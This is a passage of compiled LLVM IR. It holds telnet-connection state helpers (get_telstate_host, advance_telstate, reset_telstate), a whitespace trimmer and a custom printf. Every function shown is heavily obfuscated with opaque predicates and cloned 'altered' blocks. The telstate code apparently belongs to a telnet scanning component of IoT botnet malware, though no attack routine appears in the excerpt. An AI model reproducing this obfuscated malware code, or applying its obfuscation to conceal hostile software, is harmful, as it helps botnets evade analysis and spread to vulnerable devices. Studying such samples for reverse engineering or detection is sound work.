  %231 = getelementptr inbounds i8, i8* %230, i64 1
  %232 = load i8, i8* %231, align 1
  %233 = zext i8 %232 to i32
  %234 = icmp eq i32 3, %233
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %116
  %235 = load i8*, i8** %14, align 8
  %236 = getelementptr inbounds i8, i8* %235, i64 1
  %237 = load i8, i8* %236, align 1
  %238 = zext i8 %237 to i32
  %239 = icmp eq i32 %238, 253
  %240 = select i1 %239, i32 251, i32 253
  %241 = trunc i32 %240 to i8
  store i8 %241, i8* %16, align 1
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %140
  %242 = load i8*, i8** %14, align 8
  %243 = getelementptr inbounds i8, i8* %242, i64 1
  %244 = load i8, i8* %243, align 1
  %245 = zext i8 %244 to i32
  %246 = icmp eq i32 %245, 253
  %247 = select i1 %246, i32 252, i32 254
  %248 = trunc i32 %247 to i8
  store i8 %248, i8* %16, align 1
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %164
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %181
  br label %originalBB30
}

declare i64 @send(i32, i8*, i64, i32) #2

; Function Attrs: noinline nounwind uwtable
define i8* @get_telstate_host(%struct.telstate_t*) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  %3 = alloca %struct.in_addr, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 1
  %6 = load i32, i32* %5, align 4
  %7 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  store i32 %6, i32* %7, align 4
  %8 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  %9 = load i32, i32* %8, align 4
  %10 = call i8* @inet_ntoa(i32 %9) #5
  ret i8* %10
}

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #1

; Function Attrs: noinline nounwind uwtable
define void @advance_telstate(%struct.telstate_t*, i32) #0 {
  %3 = alloca %struct.telstate_t*, align 8
  %4 = alloca i32, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i32, i32* %4, align 4
  %6 = icmp eq i32 %5, 0
  br i1 %6, label %7, label %28

; <label>:7:                                      ; preds = %2
  %8 = load i32, i32* @x.25
  %9 = load i32, i32* @y.26
  %10 = sub i32 %8, 1
  %11 = mul i32 %8, %10
  %12 = urem i32 %11, 2
  %13 = icmp eq i32 %12, 0
  %14 = icmp slt i32 %9, 10
  %15 = or i1 %13, %14
  br i1 %15, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %7
  %16 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %17 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %16, i32 0, i32 0
  %18 = load i32, i32* %17, align 8
  %19 = call i32 @close(i32 %18)
  %20 = load i32, i32* @x.25
  %21 = load i32, i32* @y.26
  %22 = sub i32 %20, 1
  %23 = mul i32 %20, %22
  %24 = urem i32 %23, 2
  %25 = icmp eq i32 %24, 0
  %26 = icmp slt i32 %21, 10
  %27 = or i1 %25, %26
  br i1 %27, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %28

; <label>:28:                                     ; preds = %originalBBpart2, %2
  %29 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %30 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %29, i32 0, i32 7
  store i32 0, i32* %30, align 8
  %31 = load i32, i32* %4, align 4
  %32 = trunc i32 %31 to i8
  %33 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %34 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i32 0, i32 2
  store i8 %32, i8* %34, align 8
  %35 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %36 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i32 0, i32 9
  %37 = load i8*, i8** %36, align 8
  call void @llvm.memset.p0i8.i64(i8* %37, i8 0, i64 1024, i32 1, i1 false)
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %7
  %38 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %39 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %38, i32 0, i32 0
  %40 = load i32, i32* %39, align 8
  %41 = call i32 @close(i32 %40)
  br label %originalBB
}

declare i32 @close(i32) #2

; Function Attrs: noinline nounwind uwtable
define void @reset_telstate(%struct.telstate_t*) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %3 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  call void @advance_telstate(%struct.telstate_t* %3, i32 0)
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 3
  store i8 1, i8* %5, align 1
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @trim2(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #9
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  br label %10

; <label>:10:                                     ; preds = %19, %1
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i32
  %17 = call i32 @isspace(i32 %16) #9
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %22

; <label>:19:                                     ; preds = %10
  %20 = load i32, i32* %4, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %4, align 4
  br label %10

; <label>:22:                                     ; preds = %10
  br label %23

; <label>:23:                                     ; preds = %originalBBpart24, %22
  %24 = load i32, i32* %5, align 4
  %25 = load i32, i32* %4, align 4
  %26 = icmp sge i32 %24, %25
  br i1 %26, label %27, label %52

; <label>:27:                                     ; preds = %23
  %28 = load i32, i32* @x.29
  %29 = load i32, i32* @y.30
  %30 = sub i32 %28, 1
  %31 = mul i32 %28, %30
  %32 = urem i32 %31, 2
  %33 = icmp eq i32 %32, 0
  %34 = icmp slt i32 %29, 10
  %35 = or i1 %33, %34
  br i1 %35, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %27
  %36 = load i8*, i8** %2, align 8
  %37 = load i32, i32* %5, align 4
  %38 = sext i32 %37 to i64
  %39 = getelementptr inbounds i8, i8* %36, i64 %38
  %40 = load i8, i8* %39, align 1
  %41 = sext i8 %40 to i32
  %42 = call i32 @isspace(i32 %41) #9
  %43 = icmp ne i32 %42, 0
  %44 = load i32, i32* @x.29
  %45 = load i32, i32* @y.30
  %46 = sub i32 %44, 1
  %47 = mul i32 %44, %46
  %48 = urem i32 %47, 2
  %49 = icmp eq i32 %48, 0
  %50 = icmp slt i32 %45, 10
  %51 = or i1 %49, %50
  br i1 %51, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %52

; <label>:52:                                     ; preds = %originalBBpart2, %23
  %53 = phi i1 [ false, %23 ], [ %43, %originalBBpart2 ]
  br i1 %53, label %54, label %73

; <label>:54:                                     ; preds = %52
  %55 = load i32, i32* @x.29
  %56 = load i32, i32* @y.30
  %57 = sub i32 %55, 1
  %58 = mul i32 %55, %57
  %59 = urem i32 %58, 2
  %60 = icmp eq i32 %59, 0
  %61 = icmp slt i32 %56, 10
  %62 = or i1 %60, %61
  br i1 %62, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %54
  %63 = load i32, i32* %5, align 4
  %64 = add nsw i32 %63, -1
  store i32 %64, i32* %5, align 4
  %65 = load i32, i32* @x.29
  %66 = load i32, i32* @y.30
  %67 = sub i32 %65, 1
  %68 = mul i32 %65, %67
  %69 = urem i32 %68, 2
  %70 = icmp eq i32 %69, 0
  %71 = icmp slt i32 %66, 10
  %72 = or i1 %70, %71
  br i1 %72, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %23

; <label>:73:                                     ; preds = %52
  %74 = load i32, i32* @x.29
  %75 = load i32, i32* @y.30
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
  %81 = or i1 %79, %80
  br i1 %81, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %73
  %82 = load i32, i32* %4, align 4
  store i32 %82, i32* %3, align 4
  %83 = load i32, i32* @x.29
  %84 = load i32, i32* @y.30
  %85 = sub i32 %83, 1
  %86 = mul i32 %83, %85
  %87 = urem i32 %86, 2
  %88 = icmp eq i32 %87, 0
  %89 = icmp slt i32 %84, 10
  %90 = or i1 %88, %89
  br i1 %90, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %91

; <label>:91:                                     ; preds = %originalBBpart217, %originalBBpart28
  %92 = load i32, i32* @x.29
  %93 = load i32, i32* @y.30
  %94 = sub i32 %92, 1
  %95 = mul i32 %92, %94
  %96 = urem i32 %95, 2
  %97 = icmp eq i32 %96, 0
  %98 = icmp slt i32 %93, 10
  %99 = or i1 %97, %98
  br i1 %99, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %91
  %100 = load i32, i32* %3, align 4
  %101 = load i32, i32* %5, align 4
  %102 = icmp sle i32 %100, %101
  %103 = load i32, i32* @x.29
  %104 = load i32, i32* @y.30
  %105 = sub i32 %103, 1
  %106 = mul i32 %103, %105
  %107 = urem i32 %106, 2
  %108 = icmp eq i32 %107, 0
  %109 = icmp slt i32 %104, 10
  %110 = or i1 %108, %109
  br i1 %110, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %102, label %111, label %142

; <label>:111:                                    ; preds = %originalBBpart212
  %112 = load i8*, i8** %2, align 8
  %113 = load i32, i32* %3, align 4
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds i8, i8* %112, i64 %114
  %116 = load i8, i8* %115, align 1
  %117 = load i8*, i8** %2, align 8
  %118 = load i32, i32* %3, align 4
  %119 = load i32, i32* %4, align 4
  %120 = sub nsw i32 %118, %119
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds i8, i8* %117, i64 %121
  store i8 %116, i8* %122, align 1
  br label %123

; <label>:123:                                    ; preds = %111
  %124 = load i32, i32* @x.29
  %125 = load i32, i32* @y.30
  %126 = sub i32 %124, 1
  %127 = mul i32 %124, %126
  %128 = urem i32 %127, 2
  %129 = icmp eq i32 %128, 0
  %130 = icmp slt i32 %125, 10
  %131 = or i1 %129, %130
  br i1 %131, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %123
  %132 = load i32, i32* %3, align 4
  %133 = add nsw i32 %132, 1
  store i32 %133, i32* %3, align 4
  %134 = load i32, i32* @x.29
  %135 = load i32, i32* @y.30
  %136 = sub i32 %134, 1
  %137 = mul i32 %134, %136
  %138 = urem i32 %137, 2
  %139 = icmp eq i32 %138, 0
  %140 = icmp slt i32 %135, 10
  %141 = or i1 %139, %140
  br i1 %141, label %originalBBpart217, label %originalBB14alteredBB

originalBBpart217:                                ; preds = %originalBB14
  br label %91

; <label>:142:                                    ; preds = %originalBBpart212
  %143 = load i8*, i8** %2, align 8
  %144 = load i32, i32* %3, align 4
  %145 = load i32, i32* %4, align 4
  %146 = sub nsw i32 %144, %145
  %147 = sext i32 %146 to i64
  %148 = getelementptr inbounds i8, i8* %143, i64 %147
  store i8 0, i8* %148, align 1
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %27
  %149 = load i8*, i8** %2, align 8
  %150 = load i32, i32* %5, align 4
  %151 = sext i32 %150 to i64
  %152 = getelementptr inbounds i8, i8* %149, i64 %151
  %153 = load i8, i8* %152, align 1
  %154 = sext i8 %153 to i32
  %155 = call i32 @isspace(i32 %154) #9
  %156 = icmp ne i32 %155, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %54
  %157 = load i32, i32* %5, align 4
  %_ = sub i32 0, %157
  %gen = add i32 %_, -1
  %158 = add nsw i32 %157, -1
  store i32 %158, i32* %5, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %73
  %159 = load i32, i32* %4, align 4
  store i32 %159, i32* %3, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %91
  %160 = load i32, i32* %3, align 4
  %161 = load i32, i32* %5, align 4
  %162 = icmp sle i32 %160, %161
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %123
  %163 = load i32, i32* %3, align 4
  %_15 = shl i32 %163, 1
  %164 = add nsw i32 %163, 1
  store i32 %164, i32* %3, align 4
  br label %originalBB14
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #4

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #4

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8*, ...) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %2, align 8
  %4 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %5 = bitcast %struct.__va_list_tag* %4 to i8*
  call void @llvm.va_start(i8* %5)
  %6 = load i8*, i8** %2, align 8
  %7 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %8 = call i32 @print(i8** null, i8* %6, %struct.__va_list_tag* %7)
  ret i32 %8
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #5

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %4 = load i32, i32* @x.33
  %5 = load i32, i32* @y.34
  %6 = sub i32 %4, 1
  %7 = mul i32 %4, %6
  %8 = urem i32 %7, 2
  %9 = icmp eq i32 %8, 0
  %10 = icmp slt i32 %5, 10
  %11 = or i1 %9, %10
  br i1 %11, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %3
  %12 = alloca i8**, align 8
  %13 = alloca i8*, align 8
  %14 = alloca %struct.__va_list_tag*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca [2 x i8], align 1
  %19 = alloca i8*, align 8
  store i8** %0, i8*** %12, align 8
  store i8* %1, i8** %13, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %14, align 8
  store i32 0, i32* %17, align 4
  %20 = load i32, i32* @x.33
  %21 = load i32, i32* @y.34
  %22 = sub i32 %20, 1
  %23 = mul i32 %20, %22
  %24 = urem i32 %23, 2
  %25 = icmp eq i32 %24, 0
  %26 = icmp slt i32 %21, 10
  %27 = or i1 %25, %26
  br i1 %27, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %28

; <label>:28:                                     ; preds = %555, %originalBBpart2
  %29 = load i8*, i8** %13, align 8
  %30 = load i8, i8* %29, align 1
  %31 = zext i8 %30 to i32
  %32 = icmp ne i32 %31, 0
  br i1 %32, label %33, label %558

; <label>:33:                                     ; preds = %28
  %34 = load i8*, i8** %13, align 8
  %35 = load i8, i8* %34, align 1
  %36 = zext i8 %35 to i32
  %37 = icmp eq i32 %36, 37
  br i1 %37, label %38, label %546

; <label>:38:                                     ; preds = %33
  %39 = load i8*, i8** %13, align 8
  %40 = getelementptr inbounds i8, i8* %39, i32 1
  store i8* %40, i8** %13, align 8
  store i32 0, i32* %16, align 4
  store i32 0, i32* %15, align 4
  %41 = load i8*, i8** %13, align 8
  %42 = load i8, i8* %41, align 1
  %43 = zext i8 %42 to i32
  %44 = icmp eq i32 %43, 0
  br i1 %44, label %45, label %62

; <label>:45:                                     ; preds = %38
  %46 = load i32, i32* @x.33
  %47 = load i32, i32* @y.34
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %45
  %54 = load i32, i32* @x.33
  %55 = load i32, i32* @y.34
  %56 = sub i32 %54, 1
  %57 = mul i32 %54, %56
  %58 = urem i32 %57, 2
  %59 = icmp eq i32 %58, 0
  %60 = icmp slt i32 %55, 10
  %61 = or i1 %59, %60
  br i1 %61, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %558

; <label>:62:                                     ; preds = %38
  %63 = load i8*, i8** %13, align 8
  %64 = load i8, i8* %63, align 1
  %65 = zext i8 %64 to i32
  %66 = icmp eq i32 %65, 37
  br i1 %66, label %67, label %68

; <label>:67:                                     ; preds = %62
  br label %547

; <label>:68:                                     ; preds = %62
  %69 = load i8*, i8** %13, align 8
  %70 = load i8, i8* %69, align 1
  %71 = zext i8 %70 to i32
  %72 = icmp eq i32 %71, 45
  br i1 %72, label %73, label %76

; <label>:73:                                     ; preds = %68
  %74 = load i8*, i8** %13, align 8
  %75 = getelementptr inbounds i8, i8* %74, i32 1
  store i8* %75, i8** %13, align 8
  store i32 1, i32* %16, align 4
  br label %76

; <label>:76:                                     ; preds = %73, %68
  br label %77

; <label>:77:                                     ; preds = %82, %76
  %78 = load i8*, i8** %13, align 8
  %79 = load i8, i8* %78, align 1
  %80 = zext i8 %79 to i32
  %81 = icmp eq i32 %80, 48
  br i1 %81, label %82, label %87

; <label>:82:                                     ; preds = %77
  %83 = load i8*, i8** %13, align 8
  %84 = getelementptr inbounds i8, i8* %83, i32 1
  store i8* %84, i8** %13, align 8
  %85 = load i32, i32* %16, align 4
  %86 = or i32 %85, 2
  store i32 %86, i32* %16, align 4
  br label %77

; <label>:87:                                     ; preds = %77
  br label %88

; <label>:88:                                     ; preds = %141, %87
  %89 = load i32, i32* @x.33
  %90 = load i32, i32* @y.34
  %91 = sub i32 %89, 1
  %92 = mul i32 %89, %91
  %93 = urem i32 %92, 2
  %94 = icmp eq i32 %93, 0
  %95 = icmp slt i32 %90, 10
  %96 = or i1 %94, %95
  br i1 %96, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %88
  %97 = load i8*, i8** %13, align 8
  %98 = load i8, i8* %97, align 1
  %99 = zext i8 %98 to i32
  %100 = icmp sge i32 %99, 48
  %101 = load i32, i32* @x.33
  %102 = load i32, i32* @y.34
  %103 = sub i32 %101, 1
  %104 = mul i32 %101, %103
  %105 = urem i32 %104, 2
  %106 = icmp eq i32 %105, 0
  %107 = icmp slt i32 %102, 10
  %108 = or i1 %106, %107
  br i1 %108, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %100, label %109, label %114

; <label>:109:                                    ; preds = %originalBBpart28
  %110 = load i8*, i8** %13, align 8
  %111 = load i8, i8* %110, align 1
  %112 = zext i8 %111 to i32
  %113 = icmp sle i32 %112, 57
  br label %114

; <label>:114:                                    ; preds = %109, %originalBBpart28
  %115 = phi i1 [ false, %originalBBpart28 ], [ %113, %109 ]
  br i1 %115, label %116, label %144

; <label>:116:                                    ; preds = %114
  %117 = load i32, i32* @x.33
  %118 = load i32, i32* @y.34
  %119 = sub i32 %117, 1
  %120 = mul i32 %117, %119
  %121 = urem i32 %120, 2
  %122 = icmp eq i32 %121, 0
  %123 = icmp slt i32 %118, 10
  %124 = or i1 %122, %123
  br i1 %124, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %116
  %125 = load i32, i32* %15, align 4
  %126 = mul nsw i32 %125, 10
  store i32 %126, i32* %15, align 4
  %127 = load i8*, i8** %13, align 8
  %128 = load i8, i8* %127, align 1
  %129 = zext i8 %128 to i32
  %130 = sub nsw i32 %129, 48
  %131 = load i32, i32* %15, align 4
  %132 = add nsw i32 %131, %130
  store i32 %132, i32* %15, align 4
  %133 = load i32, i32* @x.33
  %134 = load i32, i32* @y.34
  %135 = sub i32 %133, 1
  %136 = mul i32 %133, %135
  %137 = urem i32 %136, 2
  %138 = icmp eq i32 %137, 0
  %139 = icmp slt i32 %134, 10
  %140 = or i1 %138, %139
  br i1 %140, label %originalBBpart242, label %originalBB10alteredBB

originalBBpart242:                                ; preds = %originalBB10
  br label %141

; <label>:141:                                    ; preds = %originalBBpart242
  %142 = load i8*, i8** %13, align 8
  %143 = getelementptr inbounds i8, i8* %142, i32 1
  store i8* %143, i8** %13, align 8
  br label %88

; <label>:144:                                    ; preds = %114
  %145 = load i8*, i8** %13, align 8
  %146 = load i8, i8* %145, align 1
  %147 = zext i8 %146 to i32
  %148 = icmp eq i32 %147, 115
  br i1 %148, label %149, label %215

; <label>:149:                                    ; preds = %144
  %150 = load i32, i32* @x.33
  %151 = load i32, i32* @y.34
  %152 = sub i32 %150, 1
  %153 = mul i32 %150, %152
  %154 = urem i32 %153, 2
  %155 = icmp eq i32 %154, 0
  %156 = icmp slt i32 %151, 10
  %157 = or i1 %155, %156
  br i1 %157, label %originalBB44, label %originalBB44alteredBB

originalBB44:                                     ; preds = %originalBB44alteredBB, %149
  %158 = load %struct.__va_list_tag*, %struct.__va_list_tag** %14, align 8
  %159 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %158, i32 0, i32 0
  %160 = load i32, i32* %159, align 8
  %161 = icmp ule i32 %160, 40
  %162 = load i32, i32* @x.33
  %163 = load i32, i32* @y.34
  %164 = sub i32 %162, 1
  %165 = mul i32 %162, %164
  %166 = urem i32 %165, 2
  %167 = icmp eq i32 %166, 0
  %168 = icmp slt i32 %163, 10
  %169 = or i1 %167, %168
  br i1 %169, label %originalBBpart246, label %originalBB44alteredBB

originalBBpart246:                                ; preds = %originalBB44
  br i1 %161, label %170, label %176

; <label>:170:                                    ; preds = %originalBBpart246
  %171 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %158, i32 0, i32 3
  %172 = load i8*, i8** %171, align 8
  %173 = getelementptr i8, i8* %172, i32 %160
  %174 = bitcast i8* %173 to i32*
  %175 = add i32 %160, 8
  store i32 %175, i32* %159, align 8
  br label %197

; <label>:176:                                    ; preds = %originalBBpart246
  %177 = load i32, i32* @x.33
  %178 = load i32, i32* @y.34
  %179 = sub i32 %177, 1
  %180 = mul i32 %177, %179
  %181 = urem i32 %180, 2
  %182 = icmp eq i32 %181, 0
  %183 = icmp slt i32 %178, 10
  %184 = or i1 %182, %183
  br i1 %184, label %originalBB48, label %originalBB48alteredBB

originalBB48:                                     ; preds = %originalBB48alteredBB, %176
  %185 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %158, i32 0, i32 2
  %186 = load i8*, i8** %185, align 8
  %187 = bitcast i8* %186 to i32*
  %188 = getelementptr i8, i8* %186, i32 8
  store i8* %188, i8** %185, align 8
  %189 = load i32, i32* @x.33
  %190 = load i32, i32* @y.34
  %191 = sub i32 %189, 1
  %192 = mul i32 %189, %191
  %193 = urem i32 %192, 2
  %194 = icmp eq i32 %193, 0
  %195 = icmp slt i32 %190, 10
  %196 = or i1 %194, %195
  br i1 %196, label %originalBBpart250, label %originalBB48alteredBB

originalBBpart250:                                ; preds = %originalBB48
  br label %197

; <label>:197:                                    ; preds = %originalBBpart250, %170
  %198 = phi i32* [ %174, %170 ], [ %187, %originalBBpart250 ]
  %199 = load i32, i32* %198, align 4
  %200 = sext i32 %199 to i64
  %201 = inttoptr i64 %200 to i8*
  store i8* %201, i8** %19, align 8
  %202 = load i8**, i8*** %12, align 8
  %203 = load i8*, i8** %19, align 8
  %204 = icmp ne i8* %203, null
  br i1 %204, label %205, label %207

; <label>:205:                                    ; preds = %197
  %206 = load i8*, i8** %19, align 8
  br label %208

; <label>:207:                                    ; preds = %197
  br label %208

; <label>:208:                                    ; preds = %207, %205
  %209 = phi i8* [ %206, %205 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @.str.327, i32 0, i32 0), %207 ]
  %210 = load i32, i32* %15, align 4
  %211 = load i32, i32* %16, align 4
  %212 = call i32 @prints(i8** %202, i8* %209, i32 %210, i32 %211)
  %213 = load i32, i32* %17, align 4
  %214 = add nsw i32 %213, %212
  store i32 %214, i32* %17, align 4
  br label %555

; <label>:215:                                    ; preds = %144
  %216 = load i32, i32* @x.33
  %217 = load i32, i32* @y.34
  %218 = sub i32 %216, 1
  %219 = mul i32 %216, %218
  %220 = urem i32 %219, 2
  %221 = icmp eq i32 %220, 0
  %222 = icmp slt i32 %217, 10
  %223 = or i1 %221, %222
  br i1 %223, label %originalBB52, label %originalBB52alteredBB

originalBB52:                                     ; preds = %originalBB52alteredBB, %215
  %224 = load i8*, i8** %13, align 8
  %225 = load i8, i8* %224, align 1
  %226 = zext i8 %225 to i32
  %227 = icmp eq i32 %226, 100
  %228 = load i32, i32* @x.33
  %229 = load i32, i32* @y.34
  %230 = sub i32 %228, 1
  %231 = mul i32 %228, %230
  %232 = urem i32 %231, 2
  %233 = icmp eq i32 %232, 0
  %234 = icmp slt i32 %229, 10
  %235 = or i1 %233, %234
  br i1 %235, label %originalBBpart254, label %originalBB52alteredBB

originalBBpart254:                                ; preds = %originalBB52
  br i1 %227, label %236, label %309

; <label>:236:                                    ; preds = %originalBBpart254
  %237 = load i8**, i8*** %12, align 8
  %238 = load %struct.__va_list_tag*, %struct.__va_list_tag** %14, align 8
  %239 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %238, i32 0, i32 0
  %240 = load i32, i32* %239, align 8
  %241 = icmp ule i32 %240, 40
  br i1 %241, label %242, label %264

; <label>:242:                                    ; preds = %236
  %243 = load i32, i32* @x.33
  %244 = load i32, i32* @y.34
  %245 = sub i32 %243, 1
  %246 = mul i32 %243, %245
  %247 = urem i32 %246, 2
  %248 = icmp eq i32 %247, 0
  %249 = icmp slt i32 %244, 10
  %250 = or i1 %248, %249
  br i1 %250, label %originalBB56, label %originalBB56alteredBB

originalBB56:                                     ; preds = %originalBB56alteredBB, %242
  %251 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %238, i32 0, i32 3
  %252 = load i8*, i8** %251, align 8
  %253 = getelementptr i8, i8* %252, i32 %240
  %254 = bitcast i8* %253 to i32*
  %255 = add i32 %240, 8
  store i32 %255, i32* %239, align 8
  %256 = load i32, i32* @x.33
  %257 = load i32, i32* @y.34
  %258 = sub i32 %256, 1
  %259 = mul i32 %256, %258
  %260 = urem i32 %259, 2
  %261 = icmp eq i32 %260, 0
  %262 = icmp slt i32 %257, 10
  %263 = or i1 %261, %262
  br i1 %263, label %originalBBpart261, label %originalBB56alteredBB

originalBBpart261:                                ; preds = %originalBB56
  br label %285

; <label>:264:                                    ; preds = %236
  %265 = load i32, i32* @x.33
  %266 = load i32, i32* @y.34
  %267 = sub i32 %265, 1
  %268 = mul i32 %265, %267
  %269 = urem i32 %268, 2
  %270 = icmp eq i32 %269, 0
  %271 = icmp slt i32 %266, 10
  %272 = or i1 %270, %271
  br i1 %272, label %originalBB63, label %originalBB63alteredBB

originalBB63:                                     ; preds = %originalBB63alteredBB, %264
  %273 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %238, i32 0, i32 2
  %274 = load i8*, i8** %273, align 8
  %275 = bitcast i8* %274 to i32*
  %276 = getelementptr i8, i8* %274, i32 8
  store i8* %276, i8** %273, align 8
  %277 = load i32, i32* @x.33
  %278 = load i32, i32* @y.34
  %279 = sub i32 %277, 1
  %280 = mul i32 %277, %279
  %281 = urem i32 %280, 2
  %282 = icmp eq i32 %281, 0
  %283 = icmp slt i32 %278, 10
  %284 = or i1 %282, %283
  br i1 %284, label %originalBBpart265, label %originalBB63alteredBB

originalBBpart265:                                ; preds = %originalBB63
  br label %285

; <label>:285:                                    ; preds = %originalBBpart265, %originalBBpart261
  %286 = phi i32* [ %254, %originalBBpart261 ], [ %275, %originalBBpart265 ]
  %287 = load i32, i32* @x.33
  %288 = load i32, i32* @y.34
  %289 = sub i32 %287, 1
  %290 = mul i32 %287, %289
  %291 = urem i32 %290, 2
  %292 = icmp eq i32 %291, 0
  %293 = icmp slt i32 %288, 10
  %294 = or i1 %292, %293
  br i1 %294, label %originalBB67, label %originalBB67alteredBB

originalBB67:                                     ; preds = %originalBB67alteredBB, %285
  %295 = load i32, i32* %286, align 4
  %296 = load i32, i32* %15, align 4
  %297 = load i32, i32* %16, align 4
  %298 = call i32 @printi(i8** %237, i32 %295, i32 10, i32 1, i32 %296, i32 %297, i32 97)
  %299 = load i32, i32* %17, align 4
  %300 = add nsw i32 %299, %298
  store i32 %300, i32* %17, align 4
  %301 = load i32, i32* @x.33
  %302 = load i32, i32* @y.34
  %303 = sub i32 %301, 1
  %304 = mul i32 %301, %303
  %305 = urem i32 %304, 2
  %306 = icmp eq i32 %305, 0
  %307 = icmp slt i32 %302, 10
  %308 = or i1 %306, %307
  br i1 %308, label %originalBBpart282, label %originalBB67alteredBB

originalBBpart282:                                ; preds = %originalBB67
  br label %555

